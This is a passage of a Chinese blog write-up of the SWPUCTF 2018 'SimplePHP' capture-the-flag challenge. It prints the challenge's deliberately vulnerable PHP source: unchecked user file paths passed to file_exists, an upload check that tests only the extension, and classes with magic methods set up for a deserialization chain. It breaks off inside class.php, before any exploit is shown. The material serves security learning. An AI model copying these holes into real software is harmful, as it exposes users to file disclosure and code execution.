@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='[SWPUCTF 2018]SimplePHP 任意文件包含？ 大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码 file.php 1 2'>
+<title>SWPUCTF_2018_SimplePHP</title>
+
+<link rel='canonical' href='http://main1o.eu.org/p/swpuctf_2018_simplephp/'>
+
+<link rel="stylesheet" href="/scss/style.min.b9d3b9e1847a2abb770d14e8117e1dcb6cdae19de947eed1abc74cc7f25e5042.css"><meta property='og:title' content='SWPUCTF_2018_SimplePHP'>
+<meta property='og:description' content='[SWPUCTF 2018]SimplePHP 任意文件包含？ 大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码 file.php 1 2'>
+<meta property='og:url' content='http://main1o.eu.org/p/swpuctf_2018_simplephp/'>
+<meta property='og:site_name' content='main1o&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='php' /><meta property='article:published_time' content='2022-08-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-08-04T00:00:00&#43;00:00'/><meta property='og:image' content='http://main1o.eu.org/luck.png' />
+<meta name="twitter:title" content="SWPUCTF_2018_SimplePHP">
+<meta name="twitter:description" content="[SWPUCTF 2018]SimplePHP 任意文件包含？ 大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码 file.php 1 2"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://main1o.eu.org/luck.png' />
+    <link rel="shortcut icon" href="/monv.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu325d5c1f3011b78da0c57ed7949f30eb_773756_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">main1o&#39;s Blog</a></h1>
+            <h2 class="site-description">🚩荆棘之路</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/swpuctf_2018_simplephp/">
+                
+                    <img src="/luck.png" loading="lazy" alt="Featured image of post SWPUCTF_2018_SimplePHP" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                ctf
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/swpuctf_2018_simplephp/">SWPUCTF_2018_SimplePHP</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2022-08-04</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</h1>
+<p>任意文件包含？</p>
+<p>大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码</p>
+<p><img src="/p/swpuctf_2018_simplephp/image-20220804225839150.png"
+	width="693"
+	height="376"
+	srcset="/p/swpuctf_2018_simplephp/image-20220804225839150_hufc75bed41948ae7fa92b95f31917784a_19400_480x0_resize_box_3.png 480w, /p/swpuctf_2018_simplephp/image-20220804225839150_hufc75bed41948ae7fa92b95f31917784a_19400_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220804225839150"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="442px"
+	
+></p>
+<p>file.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;function.php&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">_show</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// 这里传的 $file 到 class.php文件中去形成文件读取了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;file doesn\&#39;t exists.&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>function.php</p>
+<ul>
+<li>文件</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">//show_source(__FILE__); 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span> <span class="s2">&#34;base.php&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type: text/html;charset=utf-8&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_do</span><span class="p">()</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="c1">//mkdir(&#34;upload&#34;,0777); 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;上传成功!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file</span><span class="p">()</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">upload_file_check</span><span class="p">())</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">upload_file_do</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_check</span><span class="p">()</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$allowed_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;jpeg&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$extension</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;&lt;h4&gt;请选择上传的文件:&#34; . &#34;&lt;h4/&gt;&#34;; 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span><span class="nv">$allowed_types</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>base.php</p>
+<ul>
+<li>前端展示</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">session_start</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;utf-8&#34;&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;web3&lt;/title&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&#34;&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&#34;&gt;&lt;/script&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;nav class=&#34;navbar navbar-default&#34; role=&#34;navigation&#34;&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;container-fluid&#34;&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;navbar-header&#34;&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;a class=&#34;navbar-brand&#34; href=&#34;index.php&#34;&gt;首页&lt;/a&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbra-toggle&#34;&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li class=&#34;active&#34;&gt;&lt;a href=&#34;file.php?file=&#34;&gt;查看文件&lt;/a&gt;&lt;/li&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;upload_file.php&#34;&gt;上传文件&lt;/a&gt;&lt;/li&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbar-right&#34;&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;index.php&#34;&gt;&lt;span class=&#34;glyphicon glyphicon-user&#34;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/nav&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!--flag is in f1ag.php--&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>class.php</strong></p>
+<ul>
+<li>魔法方法出现最多的一个php文件</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
